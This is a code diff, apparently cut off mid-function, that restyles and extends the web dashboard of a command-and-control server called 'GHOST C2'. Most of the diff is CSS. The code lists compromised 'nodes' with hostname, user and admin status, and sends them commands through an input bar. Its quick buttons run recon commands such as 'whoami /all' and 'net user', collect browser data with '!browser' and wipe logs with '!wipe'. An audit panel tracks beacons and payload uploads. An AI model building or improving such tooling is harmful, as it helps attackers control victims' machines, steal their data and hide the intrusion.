@@ -688,207 +688,257 @@ const DASHBOARD_HTML = `<!DOCTYPE html>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 :root{
-  --bg:#080a0e;--surface:#0d1117;--surface2:#111820;--border:#1a2030;
-  --accent:#00ff88;--accent-dim:#00ff8820;--accent-glow:rgba(0,255,136,.35);
-  --red:#ff3b5c;--yellow:#f0c040;--blue:#4fc3f7;--orange:#ff8c42;
-  --text:#c9d1d9;--muted:#484f58;--muted2:#30363d;
-  --mono:'JetBrains Mono','Fira Code',monospace;
+  --bg:#060810;--surface:#0b0e18;--surface2:#0f1420;--surface3:#131824;
+  --border:#1c2436;--border2:#243040;
+  --accent:#00ff88;--accent-dim:#00ff8818;--accent-glow:rgba(0,255,136,.3);
+  --red:#ff3b5c;--red-dim:rgba(255,59,92,.15);
+  --yellow:#f0c040;--blue:#4fc3f7;--orange:#ff8c42;--purple:#c678dd;
+  --text:#cdd6f4;--text2:#a6adc8;--muted:#585b70;--muted2:#2a2d3e;
+  --hi:#00ff88;
+  --mono:'JetBrains Mono','Fira Code','Cascadia Code',monospace;
 }
 html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);font-family:var(--mono),monospace;font-size:12px}
-/* scanline overlay */
+body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
+  background:radial-gradient(ellipse 80% 50% at 50% -20%,rgba(0,255,136,.04),transparent)}
 body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
-  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.08) 2px,rgba(0,0,0,0.08) 4px)}
+  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.06) 3px,rgba(0,0,0,0.06) 4px)}
 
 /* ── HEADER ───────────────────────────────────────────── */
-header{height:44px;display:flex;align-items:center;gap:0;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0;position:relative;z-index:10}
-header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);opacity:.4}
-.hdr-logo{padding:0 16px;display:flex;align-items:center;gap:10px;border-right:1px solid var(--border);height:100%}
-.hdr-logo .ghost{font-size:13px;font-weight:700;letter-spacing:.1em;color:var(--accent);text-shadow:0 0 12px var(--accent-glow)}
-.hdr-logo .c2{font-size:10px;letter-spacing:.2em;color:var(--muted);margin-left:2px}
-.hdr-status{padding:0 16px;display:flex;align-items:center;gap:8px;border-right:1px solid var(--border);height:100%}
-.pulse{width:6px;height:6px;border-radius:50%;background:var(--muted);flex-shrink:0;transition:background .3s,box-shadow .3s}
-.pulse.live{background:var(--accent);box-shadow:0 0 8px var(--accent-glow)}
-.pulse.warn{background:var(--yellow)}
-.status-txt{font-size:10px;letter-spacing:.1em;color:var(--muted);text-transform:uppercase}
-.hdr-meta{padding:0 16px;display:flex;gap:16px;align-items:center;font-size:10px;color:var(--muted);border-right:1px solid var(--border);height:100%}
-.hdr-meta span{color:var(--text)}
-.hdr-right{margin-left:auto;padding:0 16px;display:flex;align-items:center;gap:8px}
-.hdr-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:4px 10px;font-family:var(--mono);font-size:10px;letter-spacing:.1em;cursor:pointer;text-transform:uppercase;transition:all .15s}
-.hdr-btn:hover{border-color:var(--accent);color:var(--accent)}
-.hdr-btn.danger:hover{border-color:var(--red);color:var(--red)}
-#clock{font-size:10px;color:var(--muted);letter-spacing:.05em}
+header{height:42px;display:flex;align-items:center;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0;position:relative;z-index:10}
+header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent 0%,var(--accent) 30%,var(--accent) 70%,transparent 100%);opacity:.25}
+.hdr-logo{padding:0 18px;display:flex;align-items:center;gap:8px;border-right:1px solid var(--border);height:100%;flex-shrink:0}
+.hdr-logo .ghost{font-size:14px;font-weight:700;letter-spacing:.12em;color:var(--accent);text-shadow:0 0 16px var(--accent-glow)}
+.hdr-logo .ver{font-size:9px;letter-spacing:.15em;color:var(--muted);padding:2px 5px;border:1px solid var(--border)}
+.hdr-seg{padding:0 14px;display:flex;align-items:center;gap:8px;border-right:1px solid var(--border);height:100%;flex-shrink:0}
+.pulse{width:7px;height:7px;border-radius:50%;background:var(--muted);flex-shrink:0;transition:background .3s,box-shadow .3s}
+.pulse.live{background:var(--accent);box-shadow:0 0 10px var(--accent-glow);animation:blink 2s ease-in-out infinite}
+.pulse.warn{background:var(--yellow);box-shadow:0 0 8px rgba(240,192,64,.5)}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.5}}
+.status-txt{font-size:10px;letter-spacing:.12em;color:var(--muted);text-transform:uppercase}
+.status-txt.live{color:var(--accent)}
+.hdr-kv{display:flex;flex-direction:column;justify-content:center}
+.hdr-kv .k{font-size:8px;letter-spacing:.15em;color:var(--muted);text-transform:uppercase}
+.hdr-kv .v{font-size:11px;color:var(--text);letter-spacing:.04em}
+.hdr-right{margin-left:auto;padding:0 14px;display:flex;align-items:center;gap:10px}
+#clock{font-size:10px;color:var(--muted);letter-spacing:.06em;font-variant-numeric:tabular-nums}
+.hdr-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:4px 12px;font-family:var(--mono);font-size:10px;letter-spacing:.1em;cursor:pointer;text-transform:uppercase;transition:all .15s}
+.hdr-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+.hdr-btn.danger:hover{border-color:var(--red);color:var(--red);background:var(--red-dim)}
 
 /* ── LAYOUT ───────────────────────────────────────────── */
-.workspace{display:flex;flex:1;height:calc(100dvh - 44px);overflow:hidden}
+.workspace{display:flex;flex:1;height:calc(100dvh - 42px);overflow:hidden;position:relative;z-index:1}
 
 /* ── SIDEBAR ──────────────────────────────────────────── */
-#sidebar{width:240px;flex-shrink:0;display:flex;flex-direction:column;border-right:1px solid var(--border);background:var(--surface)}
-.pane-head{padding:8px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:var(--surface2)}
+#sidebar{width:230px;flex-shrink:0;display:flex;flex-direction:column;border-right:1px solid var(--border);background:var(--surface)}
+.pane-head{padding:7px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:var(--surface2);flex-shrink:0}
 .pane-label{font-size:9px;letter-spacing:.2em;color:var(--muted);text-transform:uppercase}
-.icon-btn{background:transparent;border:none;color:var(--muted);cursor:pointer;font-family:var(--mono);font-size:11px;padding:2px 4px;transition:color .15s}
+.pane-count{font-size:9px;color:var(--accent);letter-spacing:.05em}
+.icon-btn{background:transparent;border:none;color:var(--muted);cursor:pointer;font-family:var(--mono);font-size:12px;padding:0 4px;line-height:1;transition:color .15s}
 .icon-btn:hover{color:var(--accent)}
 #session-list{flex:1;overflow-y:auto}
-.no-sessions{padding:20px 12px;color:var(--muted);font-size:10px;letter-spacing:.05em}
-.session-item{padding:10px 12px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .1s;position:relative}
-.session-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:transparent;transition:background .1s}
+.no-sessions{padding:24px 14px;color:var(--muted);font-size:10px;letter-spacing:.06em;text-align:center}
+.no-sessions::before{content:'[ ]';display:block;font-size:20px;opacity:.2;margin-bottom:8px}
+.session-item{padding:10px 12px;border-bottom:1px solid var(--border);cursor:pointer;transition:background .1s;position:relative;overflow:hidden}
+.session-item::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:transparent;transition:background .15s}
 .session-item:hover{background:var(--surface2)}
-.session-item.active{background:#0d1f15}
+.session-item.active{background:#0a1a10}
 .session-item.active::before{background:var(--accent)}
-.sid{font-size:10px;font-weight:700;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:.05em}
-.smeta{color:var(--muted);font-size:9px;margin-top:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.sbadge{display:inline-flex;align-items:center;gap:4px;margin-top:5px;padding:2px 6px;font-size:9px;letter-spacing:.08em;text-transform:uppercase;border:1px solid}
-.sbadge.live{border-color:rgba(0,255,136,.3);color:var(--accent)}
-.sbadge.tasks{border-color:rgba(240,192,64,.3);color:var(--yellow)}
-.sbadge.stale{border-color:rgba(255,59,92,.3);color:var(--red)}
+.sid{font-size:10px;font-weight:700;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:.04em;margin-bottom:3px}
+.smeta{color:var(--muted);font-size:9px;margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:.02em}
+.smeta .elevated{color:var(--yellow);font-weight:700}
+.sbadge{display:inline-flex;align-items:center;gap:4px;margin-top:6px;padding:2px 7px;font-size:8px;letter-spacing:.1em;text-transform:uppercase;border:1px solid}
+.sbadge.live{border-color:rgba(0,255,136,.25);color:var(--accent);background:rgba(0,255,136,.05)}
+.sbadge.tasks{border-color:rgba(240,192,64,.25);color:var(--yellow);background:rgba(240,192,64,.05)}
+.sbadge.stale{border-color:rgba(255,59,92,.25);color:var(--red);background:var(--red-dim)}
 .sbadge-dot{width:4px;height:4px;border-radius:50%;background:currentColor}
 
 /* ── MAIN CONTENT ─────────────────────────────────────── */
-#main{flex:1;display:flex;flex-direction:column;overflow:hidden}
-#tab-bar{display:flex;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0}
-.tab{padding:0 18px;height:36px;display:flex;align-items:center;font-size:10px;letter-spacing:.12em;text-transform:uppercase;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;gap:6px}
-.tab:hover{color:var(--text)}
+#main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
+
+/* tab bar */
+#tab-bar{display:flex;border-bottom:1px solid var(--border);background:var(--surface);flex-shrink:0;height:34px}
+.tab{padding:0 16px;height:100%;display:flex;align-items:center;font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;transition:all .15s;gap:6px;white-space:nowrap}
+.tab:hover{color:var(--text2)}
 .tab.active{color:var(--accent);border-bottom-color:var(--accent)}
-.tab-count{background:var(--surface2);padding:1px 5px;font-size:9px;color:var(--muted)}
-.tab.active .tab-count{background:var(--accent-dim);color:var(--accent)}
+.tab-count{background:var(--surface2);padding:1px 5px;font-size:8px;border-radius:2px;color:var(--muted)}
+.tab.active .tab-count{background:rgba(0,255,136,.15);color:var(--accent)}
 
-#session-header{padding:8px 14px;border-bottom:1px solid var(--border);background:var(--surface2);display:none;align-items:center;gap:10px;flex-wrap:wrap;flex-shrink:0}
-.sel-sid{font-size:11px;font-weight:700;color:var(--accent);letter-spacing:.06em}
-.sel-meta{font-size:10px;color:var(--muted);flex:1}
-.sel-actions{display:flex;gap:6px}
-.act-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:3px 8px;font-family:var(--mono);font-size:9px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;transition:all .15s}
-.act-btn:hover{border-color:var(--accent);color:var(--accent)}
-.act-btn.kill:hover{border-color:var(--red);color:var(--red)}
+/* session sub-header */
+#session-header{padding:6px 14px;border-bottom:1px solid var(--border);background:var(--surface2);display:none;align-items:center;gap:10px;flex-wrap:wrap;flex-shrink:0}
+.sel-sid{font-size:11px;font-weight:700;color:var(--accent);letter-spacing:.05em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:260px}
+.sel-meta{font-size:9px;color:var(--muted);flex:1;letter-spacing:.04em;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.sel-actions{display:flex;align-items:center;gap:6px;flex-shrink:0}
+#last-poll{font-size:9px;letter-spacing:.06em;color:var(--muted);transition:color .3s}
+.act-btn{background:transparent;border:1px solid var(--border);color:var(--muted);padding:3px 9px;font-family:var(--mono);font-size:9px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;transition:all .15s}
+.act-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
+.act-btn.kill:hover{border-color:var(--red);color:var(--red);background:var(--red-dim)}
 
-#empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:12px;color:var(--muted)}
-.empty-glyph{font-size:28px;opacity:.3;letter-spacing:.2em}
-.empty-msg{font-size:11px;letter-spacing:.15em;text-transform:uppercase;opacity:.5}
+/* empty state */
+#empty-state{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;color:var(--muted)}
+.empty-glyph{font-size:32px;opacity:.15;letter-spacing:.3em}
+.empty-msg{font-size:10px;letter-spacing:.2em;text-transform:uppercase;opacity:.4}
+.empty-hint{font-size:9px;color:var(--muted);opacity:.3;letter-spacing:.08em}
 
-#output-pane{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;display:none}
-#recon-pane{flex:1;overflow-y:auto;padding:12px;display:none}
+/* output pane — terminal log */
+#output-pane{flex:1;overflow-y:auto;padding:0;display:flex;flex-direction:column;display:none;background:var(--bg)}
+#recon-pane{flex:1;overflow-y:auto;padding:14px;display:none;background:var(--bg)}
 
-/* result entries */
-.result-entry{border:1px solid var(--border);overflow:hidden}
-.result-ts{padding:4px 10px;background:var(--surface2);color:var(--muted);font-size:9px;letter-spacing:.08em;border-bottom:1px solid var(--border);display:flex;gap:8px}
-.result-ts .ts-label{color:var(--accent);font-weight:700}
-.result-body{padding:10px;white-space:pre-wrap;word-break:break-all;color:var(--text);line-height:1.7;max-height:320px;overflow-y:auto;font-size:11px}
+/* result entries — terminal style */
+.result-entry{border-bottom:1px solid var(--border);overflow:hidden}
+.result-entry:last-child{border-bottom:none}
+.result-hdr{padding:4px 12px;background:var(--surface2);color:var(--muted);font-size:9px;letter-spacing:.08em;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
+.result-hdr .r-idx{color:var(--muted2);font-size:8px;min-width:28px}
+.result-hdr .r-ts{color:var(--muted);flex:1}
+.result-hdr .r-label{color:var(--accent);font-weight:700;font-size:8px;letter-spacing:.12em}
+.result-hdr .r-len{color:var(--muted2);font-size:8px}
+.result-body{padding:10px 12px 10px 40px;white-space:pre-wrap;word-break:break-word;color:var(--text);line-height:1.75;font-size:11px;position:relative}
+.result-body::before{content:'';position:absolute;left:28px;top:0;bottom:0;width:1px;background:var(--border)}
+.result-body .line-num{position:absolute;left:0;width:26px;text-align:right;color:var(--muted2);font-size:9px;user-select:none;line-height:1.75}
 
 /* recon grid */
-.recon-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px}
+.recon-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:6px}
 .recon-cell{border:1px solid var(--border);padding:10px 12px;background:var(--surface2)}
-.recon-key{font-size:9px;letter-spacing:.15em;color:var(--muted);text-transform:uppercase;margin-bottom:4px}
-.recon-val{font-size:12px;color:var(--text);word-break:break-all}
+.recon-key{font-size:8px;letter-spacing:.18em;color:var(--muted);text-transform:uppercase;margin-bottom:5px}
+.recon-val{font-size:12px;color:var(--text);word-break:break-all;font-weight:500}
 .recon-val.hi{color:var(--accent)}
 .recon-val.warn{color:var(--yellow)}
 .recon-val.danger{color:var(--red)}
 
 /* ── COMMAND BAR ──────────────────────────────────────── */
-#cmd-bar{padding:10px 12px;border-top:1px solid var(--border);background:var(--surface);display:none;flex-shrink:0}
-.cmd-row{display:flex;gap:6px;margin-bottom:6px}
-.cmd-prompt{color:var(--accent);font-size:12px;padding:7px 0;flex-shrink:0;letter-spacing:.05em}
-#cmd-input{flex:1;background:#050810;border:1px solid var(--border);color:var(--accent);padding:7px 10px;font-family:var(--mono);font-size:12px;outline:none;caret-color:var(--accent)}
-#cmd-input:focus{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent-dim)}
+#cmd-bar{border-top:1px solid var(--border);background:var(--surface);display:none;flex-shrink:0}
+.cmd-row{display:flex;gap:0;border-bottom:1px solid var(--border)}
+.cmd-prompt{color:var(--accent);font-size:12px;padding:8px 10px 8px 14px;flex-shrink:0;letter-spacing:.04em;border-right:1px solid var(--border);background:var(--surface2);user-select:none}
+#cmd-input{flex:1;background:transparent;border:none;color:var(--accent);padding:8px 12px;font-family:var(--mono);font-size:12px;outline:none;caret-color:var(--accent)}
 #cmd-input::placeholder{color:var(--muted)}
-.quick-cmds{display:flex;gap:4px;flex-wrap:wrap}
-.qcmd{background:transparent;border:1px solid var(--border);color:var(--muted);padding:3px 8px;font-family:var(--mono);font-size:9px;letter-spacing:.08em;cursor:pointer;text-transform:uppercase;transition:all .15s}
-.qcmd:hover{border-color:var(--accent);color:var(--accent)}
+.cmd-exec{background:transparent;border:none;border-left:1px solid var(--border);color:var(--muted);padding:0 14px;font-family:var(--mono);font-size:10px;letter-spacing:.1em;cursor:pointer;text-transform:uppercase;transition:all .15s;flex-shrink:0}
+.cmd-exec:hover{color:var(--accent);background:var(--accent-dim)}
+.quick-cmds{display:flex;gap:0;flex-wrap:nowrap;overflow-x:auto;padding:5px 8px;gap:4px}
+.quick-cmds::-webkit-scrollbar{height:2px}
+.qcmd{background:transparent;border:1px solid var(--border);color:var(--muted);padding:3px 9px;font-family:var(--mono);font-size:9px;letter-spacing:.08em;cursor:pointer;text-transform:uppercase;transition:all .15s;white-space:nowrap;flex-shrink:0}
+.qcmd:hover{border-color:var(--accent);color:var(--accent);background:var(--accent-dim)}
 
 /* ── AUDIT PANEL ──────────────────────────────────────── */
-#audit-panel{width:260px;flex-shrink:0;display:flex;flex-direction:column;border-left:1px solid var(--border);background:var(--surface)}
-#audit-list{flex:1;overflow-y:auto;padding:6px}
-.audit-entry{padding:6px 8px;margin-bottom:2px;border-left:2px solid transparent;font-size:9px}
-.audit-entry.list_sessions{border-left-color:var(--muted2)}
-.audit-entry.task_queued{border-left-color:var(--yellow)}
-.audit-entry.kill_session{border-left-color:var(--red)}
-.audit-entry.get_results{border-left-color:var(--blue)}
-.audit-entry.payload_uploaded{border-left-color:var(--orange)}
-.a-time{color:var(--muted);letter-spacing:.03em;margin-bottom:2px}
-.a-action{color:var(--text);font-weight:700;letter-spacing:.06em;text-transform:uppercase}
-.a-ip{color:var(--muted);font-size:8px;margin-top:1px}
+#audit-panel{width:250px;flex-shrink:0;display:flex;flex-direction:column;border-left:1px solid var(--border);background:var(--surface)}
+#audit-list{flex:1;overflow-y:auto}
+.audit-entry{padding:7px 10px;border-bottom:1px solid var(--border);font-size:9px;display:flex;flex-direction:column;gap:2px;position:relative;padding-left:14px}
+.audit-entry::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px}
+.audit-entry.list_sessions::before{background:var(--muted2)}
+.audit-entry.task_queued::before{background:var(--yellow)}
+.audit-entry.kill_session::before{background:var(--red)}
+.audit-entry.get_results::before{background:var(--blue)}
+.audit-entry.payload_uploaded::before{background:var(--orange)}
+.audit-entry.beacon::before{background:var(--accent)}
+.a-time{color:var(--muted);letter-spacing:.02em;font-size:8px}
+.a-action{color:var(--text);font-weight:700;letter-spacing:.08em;text-transform:uppercase;font-size:9px}
+.a-ip{color:var(--muted);font-size:8px;letter-spacing:.02em}
+.no-audit{padding:24px 14px;color:var(--muted);font-size:9px;letter-spacing:.06em;text-align:center}
 
 /* ── TOAST ────────────────────────────────────────────── */
-#toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:var(--surface2);border:1px solid var(--border);padding:8px 16px;font-size:11px;letter-spacing:.06em;opacity:0;transition:opacity .2s;pointer-events:none;z-index:9998;white-space:nowrap}
+#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--surface2);border:1px solid var(--border);padding:8px 20px;font-size:11px;letter-spacing:.06em;opacity:0;transition:opacity .2s;pointer-events:none;z-index:9998;white-space:nowrap}
 #toast.show{opacity:1}
 #toast.ok{border-color:rgba(0,255,136,.4);color:var(--accent)}
 #toast.err{border-color:rgba(255,59,92,.4);color:var(--red)}
 
 /* ── SCROLLBAR ────────────────────────────────────────── */
-::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar{width:3px;height:3px}
 ::-webkit-scrollbar-track{background:transparent}
-::-webkit-scrollbar-thumb{background:var(--border)}
+::-webkit-scrollbar-thumb{background:var(--border2)}
+::-webkit-scrollbar-thumb:hover{background:var(--muted)}
 </style>
 </head>
 <body>
 <header>
   <div class="hdr-logo">
-    <span class="ghost">GHOST</span><span class="c2">// C2</span>
+    <span class="ghost">GHOST</span>
+    <span class="ver">C2</span>
   </div>
-  <div class="hdr-status">
+  <div class="hdr-seg">
     <div class="pulse" id="pulse"></div>
     <span class="status-txt" id="status-txt">OFFLINE</span>
   </div>
-  <div class="hdr-meta">
-    SESSIONS <span id="hdr-count">0</span>
+  <div class="hdr-seg">
+    <div class="hdr-kv"><div class="k">NODES</div><div class="v" id="hdr-count">0</div></div>
+  </div>
+  <div class="hdr-seg">
+    <div class="hdr-kv"><div class="k">SELECTED</div><div class="v" id="hdr-sel" style="color:var(--muted);font-size:10px">—</div></div>
   </div>
   <div class="hdr-right">
     <span id="clock"></span>
     <button class="hdr-btn danger" onclick="logout()">LOGOUT</button>
   </div>
 </header>
+
 <div class="workspace">
+  <!-- SIDEBAR: node list -->
   <div id="sidebar">
     <div class="pane-head">
       <span class="pane-label">Active Nodes</span>
-      <button class="icon-btn" onclick="refreshSessions()" title="Refresh">&#x21bb;</button>
+      <div style="display:flex;align-items:center;gap:8px">
+        <span class="pane-count" id="node-count">0</span>
+        <button class="icon-btn" onclick="refreshSessions()" title="Refresh">&#x21bb;</button>
+      </div>
     </div>
     <div id="session-list"><div class="no-sessions">AWAITING CONNECTIONS</div></div>
   </div>
 
+  <!-- MAIN: output/recon -->
   <div id="main">
     <div id="tab-bar">
-      <div class="tab active" data-tab="output" onclick="switchTab('output')">OUTPUT <span class="tab-count" id="tc-output">0</span></div>
+      <div class="tab active" data-tab="output" onclick="switchTab('output')">
+        OUTPUT <span class="tab-count" id="tc-output">0</span>
+      </div>
       <div class="tab" data-tab="recon" onclick="switchTab('recon')">RECON</div>
     </div>
+
     <div id="session-header">
       <span class="sel-sid" id="sel-sid"></span>
       <span class="sel-meta" id="sel-meta"></span>
       <div class="sel-actions">
-        <span id="last-poll" style="font-size:9px;letter-spacing:.08em;color:var(--muted);margin-right:8px"></span>
+        <span id="last-poll"></span>
         <button class="act-btn" onclick="fetchResults()">REFRESH</button>
-        <button class="act-btn kill" onclick="killSession()">KILL</button>
+        <button class="act-btn kill" onclick="killSession()">KILL NODE</button>
       </div>
     </div>
+
     <div id="empty-state">
-      <div class="empty-glyph">[ ]</div>
-      <div class="empty-msg">Select a node to begin</div>
+      <div class="empty-glyph">&#x25A1;</div>
+      <div class="empty-msg">No node selected</div>
+      <div class="empty-hint">Click a node in the sidebar to begin</div>
     </div>
+
     <div id="output-pane"></div>
     <div id="recon-pane"></div>
+
     <div id="cmd-bar">
       <div class="cmd-row">
-        <span class="cmd-prompt">ghost&gt;&nbsp;</span>
-        <input id="cmd-input" placeholder="enter command..." onkeydown="if(event.key==='Enter')sendCmd()">
-        <button class="act-btn" onclick="sendCmd()">EXEC</button>
+        <span class="cmd-prompt">ghost@c2&nbsp;&gt;&nbsp;</span>
+        <input id="cmd-input" placeholder="enter command and press Enter..." onkeydown="handleKey(event)">
+        <button class="cmd-exec" onclick="sendCmd()">EXEC</button>
       </div>
       <div class="quick-cmds">
-        <button class="qcmd" onclick="sendCmd('whoami')">whoami</button>
+        <button class="qcmd" onclick="sendCmd('whoami /all')">whoami</button>
         <button class="qcmd" onclick="sendCmd('ipconfig /all')">ipconfig</button>
-        <button class="qcmd" onclick="sendCmd('tasklist')">tasklist</button>
         <button class="qcmd" onclick="sendCmd('systeminfo')">sysinfo</button>
-        <button class="qcmd" onclick="sendCmd('!ps ')">ps</button>
+        <button class="qcmd" onclick="sendCmd('tasklist /v')">tasklist</button>
+        <button class="qcmd" onclick="sendCmd('!ps')">ps</button>
+        <button class="qcmd" onclick="sendCmd('netstat -ano')">netstat</button>
+        <button class="qcmd" onclick="sendCmd('net user')">net user</button>
         <button class="qcmd" onclick="sendCmd('!browser')">browsers</button>
         <button class="qcmd" onclick="sendCmd('!wipe')">wipe logs</button>
       </div>
     </div>
   </div>
 
+  <!-- AUDIT PANEL -->
   <div id="audit-panel">
     <div class="pane-head">
       <span class="pane-label">Audit Log</span>
       <button class="icon-btn" onclick="fetchAudit()" title="Refresh">&#x21bb;</button>
     </div>
-    <div id="audit-list"><div class="no-sessions">NO ENTRIES</div></div>
+    <div id="audit-list"><div class="no-audit">NO ENTRIES</div></div>
   </div>
 </div>
+
 <div id="toast"></div>
 <script>
 (function(){
@@ -896,6 +946,7 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
   if (!token) { location.href = '/'; return; }
 
   let selectedSid = null, pollTimer = null, auditTimer = null, currentTab = 'output';
+  let cmdHistory = [], cmdHistIdx = -1;
 
   // ── Clock ──
   function tick() {
@@ -916,18 +967,17 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
 
   // ── API ──
   async function api(path, opts={}) {
-    const r = await fetch(path, {
-      headers: {'Content-Type':'application/json','X-Operator-Token':token},
-      ...opts
-    });
-    if (r.status === 401) { toast('SESSION EXPIRED', 'err'); setTimeout(logout, 1500); return null; }
-    return r;
+    try {
+      const r = await fetch(path, {
+        headers: {'Content-Type':'application/json','X-Operator-Token':token},
+        ...opts
+      });
+      if (r.status === 401) { toast('SESSION EXPIRED', 'err'); setTimeout(logout, 1500); return null; }
+      return r;
+    } catch(e) { toast('NETWORK ERROR', 'err'); return null; }
   }
 
-  function logout() {
-    sessionStorage.removeItem('ghost_token');
-    location.href = '/';
-  }
+  function logout() { sessionStorage.removeItem('ghost_token'); location.href = '/'; }
   window.logout = logout;
 
   // ── Sessions ──
@@ -937,17 +987,20 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
     const sessions = await r.json();
     const list = document.getElementById('session-list');
     document.getElementById('hdr-count').textContent = sessions.length;
+    document.getElementById('node-count').textContent = sessions.length;
     const pulse = document.getElementById('pulse');
     const stxt = document.getElementById('status-txt');
     if (sessions.length > 0) {
       pulse.className = 'pulse live';
       stxt.textContent = 'LIVE';
+      stxt.className = 'status-txt live';
     } else {
       pulse.className = 'pulse';
       stxt.textContent = 'IDLE';
+      stxt.className = 'status-txt';
     }
     if (!sessions.length) {
-      list.innerHTML = '<div class="no-sessions">NO ACTIVE NODES</div>';
+      list.innerHTML = '<div class="no-sessions">AWAITING CONNECTIONS</div>';
       return;
     }
     sessions.sort((a,b)=>new Date(b.last_beacon)-new Date(a.last_beacon));
@@ -955,11 +1008,12 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
       const idle = s.idle_seconds;
       const stale = idle > 180;
       const bc = s.pending_tasks>0?'tasks':stale?'stale':'live';
-      const bt = s.pending_tasks>0?(s.pending_tasks+' QUEUED'):stale?('STALE '+fmt(idle)):('LIVE '+fmt(idle));
+      const bt = s.pending_tasks>0?('&#x25B3; '+s.pending_tasks+' QUEUED'):stale?('STALE '+fmt(idle)):('&#x25CF; LIVE '+fmt(idle));
+      const elev = s.recon?.elevated ? '<span class="elevated"> &#x25B2;ADMIN</span>' : '';
       return \`<div class="session-item\${s.session===selectedSid?' active':''}" onclick="selectSession('\${esc(s.session)}')">
-        <div class="sid">\${esc(s.session.slice(0,28))}\${s.session.length>28?'...':''}</div>
-        <div class="smeta">\${esc(s.remote_ip)} // \${esc(s.recon?.hostname||'unknown')}</div>
-        <div class="smeta">\${esc(s.recon?.user||'?')} \${s.recon?.elevated?'[ELEVATED]':''}</div>
+        <div class="sid">\${esc(s.session.slice(0,26))}\${s.session.length>26?'..':''}</div>
+        <div class="smeta">\${esc(s.recon?.hostname||'unknown')}\${elev}</div>
+        <div class="smeta">\${esc(s.remote_ip)} &bull; \${esc(s.recon?.user||'?')}</div>
         <span class="sbadge \${bc}"><span class="sbadge-dot"></span>\${bt}</span>
       </div>\`;
     }).join('');
@@ -969,12 +1023,17 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
   // ── Select session ──
   async function selectSession(sid) {
     selectedSid = sid;
-    document.getElementById('sel-sid').textContent = sid;
+    lastResultCount = 0;
+    document.getElementById('sel-sid').textContent = sid.slice(0,36);
+    document.getElementById('hdr-sel').textContent = sid.slice(0,20)+'..';
+    document.getElementById('hdr-sel').style.color = 'var(--accent)';
     document.getElementById('session-header').style.display = 'flex';
     document.getElementById('empty-state').style.display = 'none';
     document.getElementById('cmd-bar').style.display = 'block';
+    document.getElementById('output-pane').dataset.sid = '';
     switchTab(currentTab);
     await Promise.all([refreshSessions(), fetchResults(), fetchRecon()]);
+    document.getElementById('cmd-input').focus();
   }
   window.selectSession = selectSession;
 
@@ -986,7 +1045,7 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
     const rp = document.getElementById('recon-pane');
     if (selectedSid) {
       op.style.display = tab==='output'?'flex':'none';
-      op.style.flexDirection = 'column';
+      if(tab==='output') op.style.flexDirection='column';
       rp.style.display = tab==='recon'?'block':'none';
     }
   }
@@ -1004,18 +1063,17 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
     const entries = data.results||[];
     if (tc) tc.textContent = String(entries.length);
 
-    // Update last-poll indicator
     const pollEl = document.getElementById('last-poll');
     if (pollEl) {
       const now = new Date();
-      pollEl.textContent = 'SYNC ' + now.toUTCString().slice(17,25) + ' UTC';
-      pollEl.style.color = 'var(--hi)';
-      setTimeout(()=>{ if(pollEl) pollEl.style.color = 'var(--muted)'; }, 1200);
